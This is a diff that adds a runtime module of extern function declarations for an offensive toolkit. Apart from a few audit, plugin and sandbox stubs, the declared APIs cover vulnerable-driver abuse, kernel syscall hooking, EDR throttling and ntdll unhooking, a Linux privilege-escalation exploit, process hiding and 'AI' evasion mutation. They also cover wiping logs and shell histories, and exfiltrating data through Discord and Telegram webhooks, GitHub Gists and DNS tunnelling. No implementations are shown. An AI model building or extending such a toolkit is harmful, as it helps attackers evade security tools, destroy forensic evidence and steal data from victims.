@@ -1,0 +1,102 @@
+module jocky.runtime
+
+// Audit and Provenance APIs
+extern fn audit_init(capacity: i32) -> i32
+extern fn audit_log(actor: &str, action: &str, input_hash: &str, output_hash: &str) -> i32
+extern fn audit_verify() -> i32
+extern fn audit_export(filename: &str) -> i32
+extern fn provenance_record(source: &str, transform: &str, output: &str) -> i32
+
+// BYOVD Driver Selection
+extern fn byovd_get_os_version() -> i32
+extern fn byovd_select_best_driver(reliability_threshold: f32) -> i32
+extern fn byovd_load_driver(driver_name: &str) -> i32
+extern fn byovd_unload_driver(handle: i32) -> i32
+extern fn byovd_test_exploit(handle: i32) -> i32
+
+// Plugin System
+extern fn plugin_load(path: &str) -> i32
+extern fn plugin_run(handle: i32, args: &str) -> i32
+extern fn plugin_unload(handle: i32) -> i32
+extern fn plugin_list() -> i32
+
+// Sandbox APIs
+extern fn sandbox_spawn(executable: &str, args: &str) -> i32
+extern fn sandbox_wait(pid: i32) -> i32
+extern fn sandbox_kill(pid: i32) -> i32
+extern fn sandbox_set_limits(pid: i32, max_memory: i32, max_cpu_ms: i32) -> i32
+extern fn sandbox_monitor(pid: i32) -> i32
+extern fn sandbox_export_trace(pid: i32, filename: &str) -> i32
+
+// Linux Kernel Module (LKM) Loading
+extern fn lkm_load(path: &str) -> i32
+extern fn lkm_unload(handle: i32) -> i32
+extern fn lkm_hook_syscall(handle: i32, syscall_num: i32) -> i32
+extern fn lkm_unhook_syscall(syscall_num: i32) -> i32
+extern fn lkm_get_syscall_table() -> i64
+
+// eBPF Program Loading
+extern fn ebpf_load(name: &str, bytecode: &[u8]) -> i32
+extern fn ebpf_attach(handle: i32, attach_point: &str) -> i32
+extern fn ebpf_detach(handle: i32) -> i32
+extern fn ebpf_map_update(handle: i32, key: &[u8], value: &[u8]) -> i32
+extern fn ebpf_map_lookup(handle: i32, key: &[u8]) -> i32
+extern fn ebpf_unload(handle: i32) -> i32
+
+// AI Evasion Engine
+extern fn ai_init() -> i32
+extern fn ai_collect_telemetry() -> i32
+extern fn ai_score_threat() -> f32
+extern fn ai_recommend_strategy() -> i32
+extern fn ai_generate_mutation() -> i32
+extern fn ai_get_current_risk() -> i32
+extern fn ai_get_statistics() -> i32
+
+// EDRChoker
+extern fn edrhoker_detect() -> i32
+extern fn edrhoker_throttle(process_id: i32, kb_per_sec: i32) -> i32
+extern fn edrhoker_restore(process_id: i32) -> i32
+
+// Blindside (Hardware Breakpoint Unhooking)
+extern fn blindside_unhook_ntdll() -> i32
+extern fn blindside_create_debug_child(executable: &str) -> i32
+
+// Fence2Pwn (Linux LPE)
+extern fn fence2pwn_detect_kfence() -> i32
+extern fn fence2pwn_exploit() -> i32
+
+// BTR Reforged (Defender Driver Abuse)
+extern fn btr_load_driver() -> i32
+extern fn btr_disable_notifications() -> i32
+extern fn btr_mask_module(module_name: &str) -> i32
+extern fn btr_delete_file(filename: &str) -> i32
+extern fn btr_kill_process(process_id: i32) -> i32
+
+// PatchGuard Peekaboo (HVCI Process Hiding)
+extern fn patchguard_hide_process(process_id: i32) -> i32
+extern fn patchguard_unhide_process(process_id: i32) -> i32
+extern fn patchguard_hidden_count() -> i32
+
+// Anti-Forensics (Windows)
+extern fn forensics_wipe_powershell_history() -> i32
+extern fn forensics_wipe_cmd_history() -> i32
+extern fn forensics_clear_event_logs() -> i32
+extern fn forensics_flush_arp_cache() -> i32
+extern fn forensics_clear_dns_cache() -> i32
+extern fn forensics_clear_usn_journal() -> i32
+extern fn forensics_cleanup_all() -> i32
+
+// Anti-Forensics (Linux)
+extern fn linux_forensics_wipe_bash_history() -> i32
+extern fn linux_forensics_wipe_zsh_history() -> i32
+extern fn linux_forensics_clear_syslog() -> i32
+extern fn linux_forensics_clear_audit_log() -> i32
+extern fn linux_forensics_clear_journal() -> i32
+extern fn linux_forensics_cleanup_all() -> i32
+
+// Exfiltration
+extern fn exfil_discord_webhook(url: &str, data: &str) -> i32
+extern fn exfil_telegram_bot(token: &str, chat_id: &str, data: &str) -> i32
+extern fn exfil_github_gist(token: &str, data: &str) -> i32
+extern fn exfil_dns_tunnel(domain: &str, data: &str) -> i32
+extern fn exfil_underminr_cdn(cdn_path: &str, data: &str) -> i32
